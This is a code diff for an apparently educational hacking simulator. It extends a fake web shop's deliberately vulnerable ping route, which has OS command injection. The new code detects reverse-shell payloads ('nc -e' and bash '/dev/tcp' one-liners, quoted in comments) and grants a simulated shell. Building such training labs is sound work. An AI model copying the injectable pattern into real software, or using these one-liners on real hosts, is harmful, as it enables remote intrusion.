@@ -7,16 +7,20 @@
 //     never anything resembling a real shell
 import { Database } from '../sim/sqlsim.js';
 import { build, escapeHtml, parseForm } from '../sim/httpsim.js';
+import { createRuntime, createSession } from '../sim/session.js';
 
 const PAGE = (title, body) => `<!DOCTYPE html>\n<html lang="en">\n<head><title>${title} - ShopZone</title></head>\n<body>\n<header><a href="/">ShopZone</a> | <a href="/search">Search</a> | <a href="/account">My Account</a> | <a href="/login">Login</a></header>\n<main>\n${body}\n</main>\n</body>\n</html>\n`;
 const randToken = () => Array.from({ length: 24 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
 
-function init(app) {
+function init(app, world) {
   const db = new Database({ name: 'shopzone', version: '5.7.33-0ubuntu0.18.04.1', user: 'shopzone@localhost', tables: app.data.tables });
   const maxOrderId = Math.max(0, ...app.data.tables.orders.rows.map((r) => r.id));
   return {
     db, sessions: new Map(), comments: app.data.comments.map((c) => ({ ...c })), nextCommentId: app.data.comments.length + 1,
     nextOrderId: maxOrderId + 1, fs: app.data.fs || {},
+    // The real host behind the command injection - a full machine a player can land a genuine shell on
+    // (chapter 6), separate from the tiny fake-shell FS (`fs` above) used to confirm RCE in chapter 4.
+    runtime: app.data.machine ? createRuntime(app.data.machine, world) : null,
   };
 }
 
@@ -78,7 +82,19 @@ function runInjectedCommand(host, fs) {
   return segments.map(buildFakeShell(fs)).join('\n');
 }
 
-function routes(app, req, state) {
+// Recognises the two classic reverse-shell one-liners (nc -e, and bash's /dev/tcp) anywhere in the
+// injected text and pulls out the attacker's ip:port - chapter 6's payload, landing a real shell instead
+// of the fake one above.
+const REVERSE_SHELL_PATTERNS = [
+  /\bnc\b.*?(\d{1,3}(?:\.\d{1,3}){3})[\s:]+(\d{2,5})\b/i, // nc [-e /bin/bash] <ip> <port> (either argument order)
+  /\/dev\/tcp\/(\d{1,3}(?:\.\d{1,3}){3})\/(\d{2,5})/i, // bash -i >& /dev/tcp/<ip>/<port> 0>&1
+];
+function detectReverseShell(host) {
+  for (const re of REVERSE_SHELL_PATTERNS) { const m = re.exec(host); if (m) return { ip: m[1], port: Number(m[2]) }; }
+  return null;
+}
+
+function routes(app, req, state, world) {
   const { method, path, query, cookies } = req;
   const session = sessionOf(req, state);
 
@@ -246,7 +262,13 @@ function routes(app, req, state) {
       return build(app, 200, { body: PAGE('Diagnostics', '<h1>Network diagnostics</h1><form><input name="host" placeholder="host to ping"><button>Ping</button></form>') }, req);
     }
     // Vulnerable: the host parameter is handed straight to a shell command (simulated) with no validation
-    // or escaping (OS command injection, OWASP A05).
+    // or escaping (OS command injection, OWASP A05). A reverse-shell payload is handled specially: it
+    // actually lands a real interactive shell on the attacker's own waiting `nc -l`, instead of just
+    // confirming RCE through the tiny fake shell below (chapter 6 builds on chapter 4's injection here).
+    const rshell = detectReverseShell(host);
+    if (rshell && state.runtime && world?.acceptReverseShell(rshell.port, rshell.ip, createSession(state.runtime))) {
+      return build(app, 200, { body: PAGE('Diagnostics', '<h1>Network diagnostics</h1><pre>Connection in progress...</pre>') }, req);
+    }
     const injected = runInjectedCommand(host, state.fs);
     const pingOutput = `PING ${host.split(/[;&|`]/)[0].trim() || host} (0.0.0.0) 56(84) bytes of data.\n--- ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss`;
     const out = injected !== null ? `${pingOutput}\n${injected}` : pingOutput;
@@ -258,5 +280,5 @@ function routes(app, req, state) {
 
 export const shopzone = {
   init,
-  handle(app, req, state) { return routes(app, req, state); },
+  handle(app, req, state, world) { return routes(app, req, state, world); },
 };
